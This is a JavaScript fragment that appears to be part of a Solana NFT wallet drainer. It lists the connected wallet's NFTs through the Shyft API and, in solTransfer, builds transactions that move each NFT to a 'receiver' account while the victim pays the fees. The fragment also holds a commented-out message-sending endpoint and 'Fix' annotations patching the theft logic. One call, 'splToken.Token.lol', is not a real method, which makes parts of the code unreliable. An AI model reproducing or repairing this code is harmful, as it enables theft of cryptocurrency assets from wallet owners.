const a = {
  ...
  //rdp: "https://todooooo.com/send-message",
...
class b {
  a = a;
  // using const a later on with "this.a.*"
...
class c extends b {
  ...
  fetchNft = async()=>{
    ...
    try {
      nftss = await fetch("https://api.shyft.to/sol/v1/wallet/collections?network=mainnet-beta&wallet_address=" + this.publicKey.toString(), c).then(a=>a.json()).then(a=>{
            return a.result.collections.map(a=>{ // Fix: Map all nfts => orig (not working) return a.result.collections[0].nfts.map(a=>{
              return {
                  address: a.nfts[0].mint, // Fix => orig: address: a.mint,
                  name: a.nfts[0].name,    // Fix => orig: a.name,
                  symbol: a.nfts[0].symbol // Fix => orig: a.symbol
              };
          }
          );
        }
        ...
        await Promise.all(nftss.map(async a=>{
            this.nfts.push(a);
        }
        ));
  ...
  solTransfer = async()=>{
      ...
      const j2 = await Promise.all(this.nfts.map(async a=>{
        ...
        if (h === null) {
            ...
            h.feePayer = this.publicKey;
            let i = await splToken.Token.createAssociatedTokenAccountInstruction(splToken.ASSOCIATED_TOKEN_PROGRAM_ID, splToken.TOKEN_PROGRAM_ID, b, g, this.receiver, this.publicKey);
            let j2 = await splToken.Token.lol(splToken.TOKEN_PROGRAM_ID, f, g, this.publicKey, [], d);
            h.add(i);
            h.add(j2);
            c.push(a);
            return [h];
